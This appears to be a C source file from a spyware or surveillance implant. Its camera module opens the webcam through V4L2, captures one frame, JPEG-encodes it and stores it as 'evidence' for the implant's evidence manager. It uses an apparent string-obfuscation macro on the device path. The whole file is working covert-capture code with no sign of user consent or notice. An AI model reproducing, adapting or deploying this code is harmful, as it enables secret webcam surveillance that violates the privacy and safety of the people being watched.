#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <openssl/bio.h>
#include <string.h>
#include <linux/videodev2.h>
#include <libv4l2.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "runtime.h"
#include "imgutils.h"

extern Display *display;

void *module_camera_main(void *args)
{
   struct v4l2_format fmt = {0};
   struct v4l2_buffer buf = {0};
   struct v4l2_requestbuffers req = {0};
   enum v4l2_buf_type type;
   struct {
      void *start;
      size_t length;
   } *buffers = NULL;

   fd_set rfds;
   struct timeval tv = { 3, 0 };
   int i, camfd = -1;

   char *dataptr = NULL;
   long datalen = 0;
   unsigned int quality = 90;

   debugme("Module CAMERA executed\n");
   if(initlib(INIT_LIBV4L2|INIT_LIBJPEG)) return NULL;

   if(MODULE_CAMERA_P) quality = MODULE_CAMERA_P->quality;

   do {
      if((camfd = v4l2_open(SO"/dev/video0", O_RDWR | O_NONBLOCK, 0)) < 0) break;

      fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
      fmt.fmt.pix.width = 640;
      fmt.fmt.pix.height = 480;
      fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_RGB24;
      fmt.fmt.pix.field = V4L2_FIELD_INTERLACED;
      if(v4l2_ioctl(camfd, VIDIOC_S_FMT, &fmt) == -1) break;
      if(fmt.fmt.pix.pixelformat != V4L2_PIX_FMT_RGB24) break;

      req.count = 2;
      req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
      req.memory = V4L2_MEMORY_MMAP;
      if(v4l2_ioctl(camfd, VIDIOC_REQBUFS, &req) == -1) break;

      if(!(buffers = calloc(req.count, sizeof(*buffers)))) break;

      for(i = 0; i < req.count; i++) {
         memset(&buf, 0x00, sizeof(buf));
         buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
         buf.memory = V4L2_MEMORY_MMAP;
         buf.index = i;
         if(v4l2_ioctl(camfd, VIDIOC_QUERYBUF, &buf) == -1) break;
         buffers[i].length = buf.length;
         if((buffers[i].start = v4l2_mmap(NULL, buf.length, PROT_READ|PROT_WRITE, MAP_SHARED, camfd, buf.m.offset)) == MAP_FAILED) break;
      }
      if(i != req.count) break;

      for(i = 0; i < req.count; i++) {
         memset(&buf, 0x00, sizeof(buf));
         buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
         buf.memory = V4L2_MEMORY_MMAP;
         buf.index = i;
         if(v4l2_ioctl(camfd, VIDIOC_QBUF, &buf) == -1) break;
      }
      if(i != req.count) break;

      type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
      if(v4l2_ioctl(camfd, VIDIOC_STREAMON, &type) == -1) break;

      FD_ZERO(&rfds);
      FD_SET(camfd, &rfds);
      if((i = select(camfd + 1, &rfds, NULL, NULL, &tv)) <= 0) break;

      memset(&buf, 0x00, sizeof(buf));
      buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
      buf.memory = V4L2_MEMORY_MMAP;
      if(v4l2_ioctl(camfd, VIDIOC_DQBUF, &buf) == -1) break;
      if(!(datalen = encodeimage(buffers[buf.index].start, fmt.fmt.pix.width, fmt.fmt.pix.height, quality, &dataptr))) break;

      evidence_write(EVIDENCE_TYPE_CAMERA, NULL, 0, dataptr, datalen);
   } while(0);
   if(camfd != -1) {
      type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
      v4l2_ioctl(camfd, VIDIOC_STREAMOFF, &type);
   }
   for(i = 0; i < req.count; i++) v4l2_munmap(buffers[i].start, buffers[i].length);
   if(camfd != -1) v4l2_close(camfd);
   if(dataptr) free(dataptr);
   if(buffers) free(buffers);

   debugme("Module CAMERA ended\n");

   return NULL;
}
